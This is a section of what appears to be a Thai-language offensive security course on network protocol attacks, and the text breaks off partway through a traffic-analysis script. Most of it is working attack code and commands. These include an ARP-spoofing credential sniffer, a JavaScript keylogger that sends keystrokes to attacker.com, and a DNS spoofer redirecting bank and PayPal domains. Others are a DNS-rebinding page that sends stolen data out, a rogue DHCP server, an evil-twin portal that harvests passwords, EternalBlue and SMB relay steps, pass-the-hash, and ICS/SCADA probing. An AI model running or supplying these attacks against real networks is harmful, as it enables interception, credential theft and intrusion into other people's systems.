# Part 17: Network Protocol Attacks
# ขั้นตอนที่ 161-170: การโจมตี Network Protocols

> **คำเตือน**: เนื้อหานี้มีไว้เพื่อการศึกษาและทดสอบในสภาพแวดล้อมที่ได้รับอนุญาตเท่านั้น

---

## ขั้นตอนที่ 161: Man-in-the-Middle (MITM) Attacks

### 161.1 ARP Spoofing

```bash
# ARP Spoofing ด้วย arpspoof (dsniff)
sudo apt install -y dsniff

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Spoof between target (192.168.1.10) and gateway (192.168.1.1)
# Window 1: Tell target that YOU are the gateway
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# Window 2: Tell gateway that YOU are the target
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Now capture traffic
sudo wireshark &
sudo tcpdump -i eth0 -w capture.pcap host 192.168.1.10
```

### 161.2 MITM ด้วย Bettercap

```bash
# ติดตั้ง bettercap
sudo apt install -y bettercap

# รัน bettercap
sudo bettercap -iface eth0

# bettercap interactive commands:
bettercap> net.probe on              # Discover hosts
bettercap> net.show                  # Show discovered hosts
bettercap> set arp.spoof.targets 192.168.1.10,192.168.1.20
bettercap> arp.spoof on              # Start ARP spoofing
bettercap> net.sniff on              # Start packet capture
bettercap> net.sniff.verbose true

# SSL Strip
bettercap> set https.proxy.sslstrip true
bettercap> https.proxy on

# Inject JavaScript into HTTP pages
bettercap> set http.proxy.script /path/to/inject.js
bettercap> http.proxy on

# Bettercap JavaScript injection example
cat > inject.js << 'EOF'
function onLoad() {
    // Inject keylogger into every HTTP page
}

function onResponse(req, res) {
    if (res.ContentType.indexOf('text/html') !== -1) {
        var body = res.ReadBody();
        body = body.replace(
            '</body>',
            '<script>document.addEventListener("keypress",function(e){' +
            'new Image().src="http://attacker.com/log?k="+e.key});</script></body>'
        );
        res.Body = body;
    }
}
EOF
```

### 161.3 MITM ด้วย Python (Scapy)

```python
#!/usr/bin/env python3
# mitm_scapy.py - ARP Spoofing with Scapy

from scapy.all import *
import time
import sys
import threading

def get_mac(ip):
    """Get MAC address for IP using ARP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    """Send spoofed ARP reply"""
    target_mac = get_mac(target_ip)
    
    # ARP reply: tell target_ip that spoof_ip is at our MAC
    packet = ARP(
        op=2,           # ARP reply
        pdst=target_ip, # Target IP
        hwdst=target_mac,  # Target MAC
        psrc=spoof_ip   # Spoof as this IP
    )
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    """Restore original ARP table"""
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    packet = ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(packet, count=4, verbose=False)

def sniff_credentials(iface):
    """Sniff HTTP credentials from captured traffic"""
    def process_packet(packet):
        if packet.haslayer(Raw):
            load = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # Look for HTTP POST with credentials
            keywords = ['username', 'password', 'passwd', 'login', 'user', 'pass']
            if packet.haslayer(TCP) and packet[TCP].dport == 80:
                for keyword in keywords:
                    if keyword in load.lower():
                        print(f"[!] Potential credentials:")
                        print(f"    {load[:500]}")
                        break
    
    sniff(iface=iface, filter="tcp port 80", prn=process_packet, store=False)

def main(target_ip, gateway_ip, iface='eth0'):
    # Enable IP forwarding
    import subprocess
    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
    
    print(f"[*] Starting MITM between {target_ip} and {gateway_ip}")
    print("[*] Press Ctrl+C to stop")
    
    # Start credential sniffer in background
    sniff_thread = threading.Thread(
        target=sniff_credentials,
        args=(iface,),
        daemon=True
    )
    sniff_thread.start()
    
    sent_packets = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets += 2
            print(f"\r[*] Packets sent: {sent_packets}", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Done")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_ip> <gateway_ip> [iface]")
        sys.exit(1)
    
    iface = sys.argv[3] if len(sys.argv) > 3 else 'eth0'
    main(sys.argv[1], sys.argv[2], iface)
```

---

## ขั้นตอนที่ 162: SSL/TLS Attacks

### 162.1 SSL Strip Attack

```bash
# SSLstrip - downgrade HTTPS to HTTP
sudo apt install -y sslstrip

# Setup iptables rule เพื่อ redirect HTTPS port
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Run sslstrip
sudo sslstrip -l 8080 -w sslstrip.log

# ดูผล
 tail -f sslstrip.log | grep -E 'user|pass|login'

# SSLstrip+ (bypass HSTS)
git clone https://github.com/LeonardoNve/sslstrip2.git
cd sslstrip2
python3 sslstrip.py -l 10000 -a -k -f /tmp/sslstripped.log
```

### 162.2 TLS Certificate Inspection

```python
#!/usr/bin/env python3
# tls_analyzer.py - TLS/SSL Certificate Analysis

import ssl
import socket
import datetime
import json
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def analyze_tls(hostname, port=443):
    """Analyze TLS certificate and configuration"""
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    try:
        with socket.create_connection((hostname, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                
                # Get TLS info
                tls_version = ssock.version()
                cipher = ssock.cipher()
                cert_der = ssock.getpeercert(binary_form=True)
                cert = x509.load_der_x509_certificate(cert_der, default_backend())
                
                print(f"=== TLS Analysis for {hostname}:{port} ===")
                print(f"TLS Version: {tls_version}")
                print(f"Cipher: {cipher[0]}")
                print(f"Key Bits: {cipher[2]}")
                
                print(f"\n--- Certificate Info ---")
                print(f"Subject: {cert.subject}")
                print(f"Issuer: {cert.issuer}")
                print(f"Valid From: {cert.not_valid_before}")
                print(f"Valid Until: {cert.not_valid_after}")
                
                # Check expiry
                days_left = (cert.not_valid_after - datetime.datetime.now()).days
                print(f"Days Until Expiry: {days_left}")
                if days_left < 30:
                    print(f"[!] WARNING: Certificate expires soon!")
                
                # Check SAN
                try:
                    san = cert.extensions.get_extension_for_class(
                        x509.SubjectAlternativeName
                    )
                    print(f"\nSAN Domains:")
                    for name in san.value:
                        print(f"  {name}")
                except:
                    pass
                
                # Weak cipher detection
                weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT', 'anon']
                if any(w in cipher[0] for w in weak_ciphers):
                    print(f"[!] WEAK CIPHER DETECTED: {cipher[0]}")
                
                # Old TLS version
                if tls_version in ['TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3']:
                    print(f"[!] OUTDATED TLS VERSION: {tls_version}")
                
                return {
                    'hostname': hostname,
                    'tls_version': tls_version,
                    'cipher': cipher[0],
                    'cert_expiry': cert.not_valid_after.isoformat(),
                    'days_left': days_left
                }
    
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def scan_tls_config(hostname):
    """Check for TLS misconfigurations"""
    # Test old protocol versions
    tests = [
        (ssl.PROTOCOL_TLS_CLIENT, 'TLS'),
    ]
    
    weak_protocols = [
        ssl.OP_NO_TLSv1,
        ssl.OP_NO_TLSv1_1,
    ]
    
    print(f"\n[*] Checking for SSLv3 support...")
    # Try to connect with SSLv3 (should be disabled)
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.options &= ~ssl.OP_NO_SSLv3
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        with socket.create_connection((hostname, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                if 'SSLv3' in ssock.version():
                    print(f"[!] SSLv3 ENABLED - Vulnerable to POODLE!")
    except:
        print("[+] SSLv3 not supported")

if __name__ == '__main__':
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else 'example.com'
    analyze_tls(host)
    scan_tls_config(host)
```

### 162.3 testssl.sh - Comprehensive TLS Testing

```bash
# testssl.sh - Comprehensive SSL/TLS testing
git clone --depth 1 https://github.com/drwetter/testssl.sh.git
cd testssl.sh

# ทดสอบทุกอย่าง
bash testssl.sh target.com

# ทดสอบเฉพาะส่วน
bash testssl.sh --vulnerabilities target.com  # BEAST, POODLE, DROWN, etc.
bash testssl.sh --cipher-per-proto target.com  # Cipher support
bash testssl.sh --headers target.com           # Security headers
bash testssl.sh --protocols target.com         # Protocol support

# Vulnerabilities check:
# HEARTBLEED, CCS Injection, ROBOT, LUCKY13,
# BEAST, CRIME, BREACH, POODLE, TLS Fallback SCSV,
# SWEET32, DROWN, LOGJAM, FREAK, ROCA

# ส่ง output
bash testssl.sh --jsonfile report.json target.com
bash testssl.sh --htmlfile report.html target.com
```

---

## ขั้นตอนที่ 163: DNS Attacks

### 163.1 DNS Spoofing

```python
#!/usr/bin/env python3
# dns_spoof.py - DNS Spoofing with Scapy

from scapy.all import *

# กำหนด DNS records ที่ต้องการ spoof
DNS_RECORDS = {
    'bank.com': '192.168.1.100',         # Redirect to fake site
    'paypal.com': '192.168.1.100',
    'login.microsoftonline.com': '192.168.1.100',
}

def dns_spoof(pkt):
    """Intercept DNS queries and send spoofed responses"""
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0):  # DNS query
        return
    
    queried_host = pkt[DNS].qd.qname.decode('utf-8').rstrip('.')
    
    if queried_host in DNS_RECORDS:
        fake_ip = DNS_RECORDS[queried_host]
        
        print(f"[*] Intercepting DNS query for: {queried_host}")
        print(f"    Sending fake response: {fake_ip}")
        
        # Build spoofed DNS response
        spoofed_pkt = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
            DNS(
                id=pkt[DNS].id,
                qr=1,       # Response
                aa=1,       # Authoritative
                qd=pkt[DNS].qd,
                an=DNSRR(
                    rrname=pkt[DNS].qd.qname,
                    ttl=10,
                    rdata=fake_ip
                )
            )
        )
        
        send(spoofed_pkt, verbose=False)
        print(f"    [+] Sent spoofed response")

# Start sniffing DNS queries
print("[*] DNS Spoofing started...")
sniff(
    filter="udp port 53",
    prn=dns_spoof,
    store=False,
    iface="eth0"
)
```

### 163.2 DNS Zone Transfer

```bash
# DNS Zone Transfer (AXFR)
# ถ้า DNS server ไม่ได้กำหนด access control จะเปิดเผยรายชื่อสุบทั้งหมด

# วิธีที่ 1: dig
dig @ns1.target.com target.com AXFR
dig @ns1.target.com target.com ANY

# วิธีที่ 2: fierce
fiercer --domain target.com

# วิธีที่ 3: dnsenum
dnsenum target.com
dnsenum --enum -f /usr/share/wordlists/dnsmap.txt target.com

# วิธีที่ 4: dnsrecon
dnsrecon -d target.com -t axfr
dnsrecon -d target.com -t std
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt
```

### 163.3 DNS Rebinding Attack

```python
#!/usr/bin/env python3
# dns_rebind_server.py - DNS Rebinding Attack Server

from dnslib import *
from dnslib.server import *
import time

# DNS Rebinding: ผู้โจมตีควบคุม DNS server
# - ครั้งแรก: ตอบ IP จริงของ attacker.com (bypass SOP)
# - ครั้งที่สอง: ตอบ 127.0.0.1 (เหมือนเป็น localhost ใน browser)

REBIND_DOMAIN = "rebind.attacker.com"
ATTACKER_IP = "1.2.3.4"
REBIND_TARGET = "127.0.0.1"

# Track which request count per client
client_requests = {}

class RebindResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        client_ip = handler.client_address[0]
        
        if REBIND_DOMAIN in qname:
            # Count requests from this client
            if client_ip not in client_requests:
                client_requests[client_ip] = 0
            client_requests[client_ip] += 1
            
            reply = request.reply()
            
            if client_requests[client_ip] <= 1:
                # First request: return attacker's real IP
                reply.add_answer(
                    RR(qname, QTYPE.A, rdata=A(ATTACKER_IP), ttl=1)
                )
                print(f"[*] Client {client_ip}: Returning attacker IP {ATTACKER_IP}")
            else:
                # Subsequent requests: return 127.0.0.1
                reply.add_answer(
                    RR(qname, QTYPE.A, rdata=A(REBIND_TARGET), ttl=1)
                )
                print(f"[*] Client {client_ip}: REBINDING to {REBIND_TARGET}!")
            
            return reply
        
        # Pass through other queries
        return request.reply()

# Attack page (host this on attacker server)
ATTACK_PAGE = """
<html>
<script>
async function attack() {
    const DOMAIN = 'rebind.attacker.com';
    
    // Wait for DNS rebinding to happen
    await new Promise(r => setTimeout(r, 5000));
    
    // Now fetch from 'attacker.com' which actually hits 127.0.0.1
    const resp = await fetch(`http://${DOMAIN}/api/secret`);
    const data = await resp.text();
    
    // Send data back to real attacker server
    fetch('http://collector.attacker.com/data?d=' + btoa(data));
}

attack();
</script>
</html>
"""

print("[*] DNS Rebinding Server")
print(f"[*] Listen on UDP 53")
print(f"[*] Rebind domain: {REBIND_DOMAIN}")
```

---

## ขั้นตอนที่ 164: DHCP Attacks

### 164.1 DHCP Starvation

```python
#!/usr/bin/env python3
# dhcp_starvation.py - Exhaust DHCP IP pool

from scapy.all import *
import random
import threading
import time

def create_random_mac():
    """Generate random MAC address"""
    return ":".join([f"{random.randint(0,255):02x}" for _ in range(6)])

def dhcp_starvation(iface='eth0', count=255):
    """Send DHCP Discover with random MACs to exhaust IP pool"""
    
    print(f"[*] Starting DHCP Starvation on {iface}")
    print(f"[*] Sending {count} requests...")
    
    for i in range(count):
        # Random source MAC
        mac = create_random_mac()
        mac_bytes = bytes.fromhex(mac.replace(':', ''))
        
        dhcp_discover = (
            Ether(dst='ff:ff:ff:ff:ff:ff', src=mac) /
            IP(src='0.0.0.0', dst='255.255.255.255') /
            UDP(sport=68, dport=67) /
            BOOTP(
                chaddr=mac_bytes,
                xid=random.randint(0, 0xFFFFFFFF)
            ) /
            DHCP(options=[
                ('message-type', 'discover'),
                'end'
            ])
        )
        
        sendp(dhcp_discover, iface=iface, verbose=False)
        print(f"\r[*] Sent {i+1}/{count} DHCP Discovers", end='')
        time.sleep(0.05)
    
    print(f"\n[+] Starvation attack complete")

def rogue_dhcp_server(iface='eth0', server_ip='192.168.1.254', 
                       gateway='192.168.1.1', dns='8.8.8.8'):
    """Set up rogue DHCP server (after starvation)"""
    
    lease_pool = {}
    ip_counter = [200]  # Starting IP for leases
    
    def handle_dhcp(pkt):
        if DHCP not in pkt:
            return
        
        msg_type = None
        for opt in pkt[DHCP].options:
            if opt[0] == 'message-type':
                msg_type = opt[1]
        
        client_mac = pkt[Ether].src
        
        if msg_type == 1:  # DHCP Discover
            # Assign IP from our pool
            if client_mac not in lease_pool:
                lease_pool[client_mac] = f"192.168.1.{ip_counter[0]}"
                ip_counter[0] += 1
            
            offered_ip = lease_pool[client_mac]
            
            offer = (
                Ether(src=get_if_hwaddr(iface), dst=client_mac) /
                IP(src=server_ip, dst=offered_ip) /
                UDP(sport=67, dport=68) /
                BOOTP(
                    op=2,
                    yiaddr=offered_ip,
                    siaddr=server_ip,
                    chaddr=pkt[BOOTP].chaddr
                ) /
                DHCP(options=[
                    ('message-type', 'offer'),
                    ('server_id', server_ip),
                    ('lease_time', 86400),
                    ('subnet_mask', '255.255.255.0'),
                    ('router', gateway),         # Redirect traffic via attacker
                    ('name_server', server_ip),  # DNS via attacker
                    'end'
                ])
            )
            
            sendp(offer, iface=iface, verbose=False)
            print(f"[*] Offered {offered_ip} to {client_mac}")
    
    print(f"[*] Rogue DHCP server started on {iface}")
    sniff(filter="udp and (port 67 or port 68)", prn=handle_dhcp, iface=iface)

print("[*] Starting DHCP attack sequence:")
print("1. Exhaust legitimate DHCP pool")
print("2. Set up rogue DHCP server")
print("3. All new DHCP clients will use attacker as default gateway")
```

---

## ขั้นตอนที่ 165: Wireless Network Attacks

### 165.1 WPA2 Cracking

```bash
# Wireless Attack Toolkit
sudo apt install -y aircrack-ng

# Step 1: Set adapter to monitor mode
ip link show  # Find wireless interface
sudo airmon-ng check kill  # Kill interfering processes
sudo airmon-ng start wlan0  # wlan0mon created

# Step 2: Scan for networks
sudo airodump-ng wlan0mon

# สังเกต: BSSID, Channel, ESSID, Clients

# Step 3: Capture on specific target
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF \
    -w capture wlan0mon

# Step 4: Deauth attack (สั่ง client พยักเพื่อ capture handshake)
sudo aireplay-ng --deauth 10 \
    -a AA:BB:CC:DD:EE:FF \
    -c 11:22:33:44:55:66 \
    wlan0mon

# รอ handshake ใน airodump-ng output (WPA handshake: xx:xx)

# Step 5: Crack the password
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
    capture-01.cap

# หรือใช้ hashcat (เร็วกว่ามาก)
# แปลงเป็น format สำหรับ hashcat
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# PMK cache attack (faster)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
    --session wifi_crack -r /usr/share/hashcat/rules/best64.rule
```

### 165.2 Evil Twin Attack

```bash
# Evil Twin - สร้าง AP หลอก (hostapd + dnsmasq)

# ติดตั้ง
sudo apt install -y hostapd dnsmasq

# Configuration files
cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWifi_Corporate
hw_mode=g
channel=6
wpa=0
EOF

cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
EOF

# Setup network interface
sudo ip addr add 10.0.0.1/24 dev wlan0
sudo ip link set wlan0 up

# NAT สำหรับ internet access
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i eth0 -o wlan0 -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Redirect HTTP to capture portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
    -j REDIRECT --to-port 8080

# Run hostapd
sudo hostapd /tmp/hostapd.conf &

# Run dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf --no-daemon &

# Run capture portal
python3 << 'PORTAL'
from flask import Flask, request, redirect
import datetime

app = Flask(__name__)
creds_file = "/tmp/captured_creds.txt"

@app.route('/', methods=['GET', 'POST'])
def portal():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        client_ip = request.remote_addr
        
        with open(creds_file, 'a') as f:
            f.write(f"{datetime.datetime.now()} | {client_ip} | {username} | {password}\n")
        
        print(f"[!] CREDENTIALS CAPTURED: {username}:{password}")
        return redirect('https://google.com')
    
    return '''
    <html><body style="text-align:center;font-family:Arial">
    <h2>Free WiFi - Login Required</h2>
    <form method="post">
        Username: <input name="username"><br><br>
        Password: <input type="password" name="password"><br><br>
        <input type="submit" value="Connect">
    </form>
    </body></html>
    '''

app.run(host='0.0.0.0', port=8080)
PORTAL
```

### 165.3 WPS Attack

```bash
# WPS (Wi-Fi Protected Setup) Attack

# Scan for WPS-enabled networks
sudo wash -i wlan0mon

# Reaver - brute force WPS PIN
sudo reaver -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -c 6 \
    -vv \
    --no-associate  # ใช้ที่ associate แล้ว

# Pixiewps - Offline WPS attack
sudo pixiewps -e <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce> -s <PKe>

# bully - Alternative WPS cracker
sudo bully -b AA:BB:CC:DD:EE:FF \
    -c 6 \
    -d \
    -v 3 \
    wlan0mon
```

---

## ขั้นตอนที่ 166: VPN และ Tunneling Attacks

### 166.1 VPN Reconnaissance

```bash
# VPN Discovery

# IKE (IPsec) Scanning
sudo apt install -y ike-scan
ike-scan 192.168.1.0/24
ike-scan -M target.com  # Aggressive mode

# Fingerprint VPN vendor
ike-scan --showbackoff target.com

# OpenVPN detection
nmap -sU -p 1194 target.com -sV
nmap -sT -p 443,1194,8443 target.com --script openvpn-*

# Cisco VPN
nmap -sU -p 500 target.com --script ike-version

# SSL VPN portals
nmap -sT -p 443,8443 target.com --script ssl-vpn-check
```

### 166.2 SSH Tunneling & Port Forwarding

```bash
# SSH Tunneling Techniques

# Local Port Forwarding
# Forward localhost:8080 -> target:80 via SSH server
ssh -L 8080:target_internal:80 user@ssh_server

# Remote Port Forwarding (Reverse Tunnel)
# Forward ssh_server:4444 -> localhost:4444
ssh -R 4444:localhost:4444 user@external_server

# Dynamic SOCKS Proxy
ssh -D 1080 user@ssh_server
# ตั้ง browser ใช้ SOCKS5 proxy 127.0.0.1:1080

# Jump Host
ssh -J jumphost.com user@internal_server

# ProxyJump Chain
ssh -J user@jump1,user@jump2 user@target

# Sshuttle - VPN over SSH
sshuttle -r user@ssh_server 0/0 --dns
sshuttle -r user@ssh_server 10.0.0.0/8  # Only tunnel internal

# Chisel - Fast TCP/UDP Tunneling
# Server side
chisel server -p 8080 --reverse

# Client side (reverse tunnel)
chisel client server_ip:8080 R:socks  # SOCKS5 reverse proxy
chisel client server_ip:8080 R:1080:socks
chisel client server_ip:8080 R:3389:10.0.0.1:3389  # RDP
```

### 166.3 HTTP Tunneling

```python
#!/usr/bin/env python3
# http_tunnel.py - Tunnel TCP over HTTP
# สำหรับผ่าน firewall ที่อนุญาตเฉพาะ HTTP/HTTPS

# Tools for HTTP tunneling:
tools = [
    "chisel   - TCP tunneling over HTTP",
    "neo-reGeorg - Web shell based tunneling",
    "pivotnacci - SOCKS proxy via web shell",
    "reGeorg - HTTP tunnel via webshell",
]

for t in tools:
    print(f"  {t}")

# neo-reGeorg setup:
print("""
# neo-reGeorg
git clone https://github.com/L-codes/Neo-reGeorg.git
cd Neo-reGeorg

# Generate tunnel script
python3 neoreg.py generate -k password123

# Upload tunnel.php/tunnel.aspx/tunnel.jsp to target server
# Then connect:
python3 neoreg.py -k password123 \
    -u http://target.com/tunnel.php \
    -l 127.0.0.1 \
    -p 1080

# Now use 127.0.0.1:1080 as SOCKS5 proxy
proxychains nmap -sT -p 80,443,3389 10.0.0.0/24
""")
```

---

## ขั้นตอนที่ 167: SMB Attacks

### 167.1 SMB Exploitation

```bash
# SMB Attack Techniques

# Enumerate SMB
network_prefix="192.168.1"
nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2020-0796 \
    $network_prefix.0/24

# EternalBlue (MS17-010) - Metasploit
console_cmds=$(cat << 'EOF'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 192.168.1.100
set LPORT 4444
run
EOF
)

# SMBGhost (CVE-2020-0796)
nmap -p 445 --script smb-vuln-cve2020-0796 192.168.1.0/24

# SMB Relay Attack
# Step 1: Disable SMB signing requirement
responder -I eth0 -rdw  # Capture NTLM hashes via LLMNR/NBT-NS

# Step 2: Relay to target
impacket-ntlmrelayx -tf targets.txt -smb2support
# Or relay to specific target:
impacket-ntlmrelayx -t 192.168.1.10 -smb2support -c "whoami > C:\\out.txt"

# SMB Share Enumeration
impacket-smbclient -no-pass //target/sharename
smbclient -N -L //target
smbmap -H target -u 'guest' -p ''
smbmap -H target -u 'admin' -p 'password'

# Download from SMB
smbget -R smb://target/share/
curl -u 'user:pass' smb://target/share/file.txt
```

### 167.2 Pass-the-Hash (PtH)

```bash
# Pass-the-Hash - ใช้ NTLM hash แทน password

# CrackMapExec
crackmapexec smb 192.168.1.0/24 \
    -u Administrator \
    -H 'aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1244a3f489a9adee498' \
    --local-auth

# Execute command via PtH
crackmapexec smb 192.168.1.10 \
    -u Administrator \
    -H 'HASH' \
    -x 'whoami /all'

# Dump SAM via PtH
crackmapexec smb 192.168.1.10 \
    -u Administrator \
    -H 'HASH' \
    --sam

# impacket-psexec with hash
impacket-psexec -hashes 'LM:NTLM' Administrator@192.168.1.10

# impacket-wmiexec with hash
impacket-wmiexec -hashes ':NTLM' Administrator@192.168.1.10

# impacket-smbexec with hash
impacket-smbexec -hashes ':NTLM' Administrator@192.168.1.10
```

---

## ขั้นตอนที่ 168: IPv6 Attacks

### 168.1 IPv6 MITM

```bash
# IPv6 Attacks
sudo apt install -y thc-ipv6

# Router Advertisement Spoofing
# ส่ง fake RA เพื่อเป็น default IPv6 gateway
fake_router6 eth0 ::1/64

# DHCPv6 Attack
fake_dhcps6 eth0  # Start fake DHCPv6 server

# NDP Spoofing (IPv6 version of ARP spoofing)
redir6 eth0 target_ip6 gateway_ip6

# IPv6 MITM with mitm6
# mitm6 - IPv6 DHCP attack + WPAD poisoning
pip3 install mitm6
mitm6 -d domain.local

# Combined with ntlmrelayx:
impacket-ntlmrelayx -6 -t ldaps://dc.domain.local \
    --delegate-access \
    --no-smb-server
```

### 168.2 IPv6 Scanning

```bash
# IPv6 Network Scanning

# Discover IPv6 addresses via ICMPv6
nmap -6 -sV fe80::/64 --disable-arp-ping

# Multicast groups
ping6 -I eth0 ff02::1  # All-nodes
ping6 -I eth0 ff02::2  # All-routers
ping6 -I eth0 ff02::fb # mDNS

# สแกน IPv6 link-local addresses
nmap -6 fe80::1-ff:fe00:1/64%eth0

# ping6 broadcast
ping6 ff02::1%eth0 -c 3

# atk6 toolkit
scansix eth0  # Scan IPv6
firewall6 eth0 target_ip6  # Firewall evasion
```

---

## ขั้นตอนที่ 169: Industrial Control Systems (ICS/SCADA)

### 169.1 ICS Protocol Analysis

```python
#!/usr/bin/env python3
# ics_scanner.py - ICS/SCADA Security Testing

import socket
import struct
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

# Modbus - Most common ICS protocol
def scan_modbus(host, port=502):
    """Scan Modbus TCP device"""
    try:
        client = ModbusTcpClient(host, port=port)
        connection = client.connect()
        
        if connection:
            print(f"[+] Modbus TCP connection established: {host}:{port}")
            
            # Read coils (Digital Outputs)
            result = client.read_coils(0, 10, unit=1)
            if not result.isError():
                print(f"  Coils (DO 0-9): {result.bits[:10]}")
            
            # Read discrete inputs (Digital Inputs)
            result = client.read_discrete_inputs(0, 10, unit=1)
            if not result.isError():
                print(f"  Discrete Inputs (DI 0-9): {result.bits[:10]}")
            
            # Read holding registers
            result = client.read_holding_registers(0, 10, unit=1)
            if not result.isError():
                print(f"  Holding Registers (HR 0-9): {result.registers}")
            
            # Read input registers
            result = client.read_input_registers(0, 10, unit=1)
            if not result.isError():
                print(f"  Input Registers (IR 0-9): {result.registers}")
            
            # DANGEROUS: Write to coil (turn on/off)
            # client.write_coil(0, True, unit=1)
            # print("  [!] Wrote True to coil 0")
            
            client.close()
            return True
    
    except Exception as e:
        print(f"[-] Modbus error: {e}")
    
    return False

# Siemens S7 Protocol
def scan_s7(host, port=102):
    """Scan Siemens S7 PLC"""
    # S7comm connection setup (ISO-TSAP)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        
        # TPKT + COTP connection request
        cr_packet = bytes.fromhex(
            '030000231ee00000001400c1020100c2020300c0010a'
        )
        sock.send(cr_packet)
        response = sock.recv(1024)
        
        if response[5] == 0xd0:  # Connection Confirm
            print(f"[+] S7 PLC connected: {host}:{port}")
            
            # S7 Read SZL (System Status List)
            # This reveals PLC model, firmware, etc.
            s7_identify = bytes.fromhex(
                '0300002902f080320100000000001400050501120a'
                '1000020000000001000100'
            )
            sock.send(s7_identify)
            id_response = sock.recv(1024)
            
            if len(id_response) > 30:
                print(f"  PLC Response length: {len(id_response)} bytes")
                print(f"  Raw data: {id_response.hex()[:100]}")
        
        sock.close()
    except Exception as e:
        print(f"[-] S7 error: {e}")

# DNP3 Protocol (Power Grid)
def scan_dnp3(host, port=20000):
    """Send DNP3 Data Link Layer packet"""
    # DNP3 Data Link Layer Header
    dnp3_packet = (
        b'\x05\x64'  # Start bytes
        b'\x05'      # Length
        b'\xc0'      # Control: DIR, PRM, FUNC=0 (RESET_LINK_STATES)
        b'\xff\xff'  # Destination: 65535 (broadcast)
        b'\x00\x00'  # Source: 0
    )
    
    # Calculate CRC (simplified)
    crc = 0xFFFF
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((host, port))
        sock.send(dnp3_packet)
        response = sock.recv(1024)
        
        if response[:2] == b'\x05\x64':
            print(f"[+] DNP3 device found: {host}:{port}")
            print(f"    Response: {response.hex()}")
        
        sock.close()
    except Exception:
        pass

print("[*] ICS/SCADA Scanner")
print("[*] Common ICS Ports:")
print("  Modbus TCP: 502")
print("  DNP3: 20000")
print("  Siemens S7: 102")
print("  EtherNet/IP: 44818")
print("  OPC-UA: 4840")
print("  BACnet: 47808 (UDP)")
print("  IEC 61850 MMS: 102")
print("  Profinet: 34962-34964")
```

---

## ขั้นตอนที่ 170: Network Traffic Analysis

### 170.1 Advanced Packet Analysis

```python
#!/usr/bin/env python3
# traffic_analyzer.py - Network Traffic Analysis

from scapy.all import *
import collections
import datetime

class TrafficAnalyzer:
    def __init__(self):
        self.connections = collections.defaultdict(list)
        self.credentials = []
        self.dns_queries = []
        self.file_transfers = []
    
    def analyze_pcap(self, pcap_file):
        """Analyze PCAP file"""
        packets = rdpcap(pcap_file)
        print(f"[*] Loaded {len(packets)} packets")
        
        for pkt in packets:
            self.process_packet(pkt)
        
        self.report()
    
    def process_packet(self, pkt):
        """Process individual packet"""
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            
            # TCP analysis
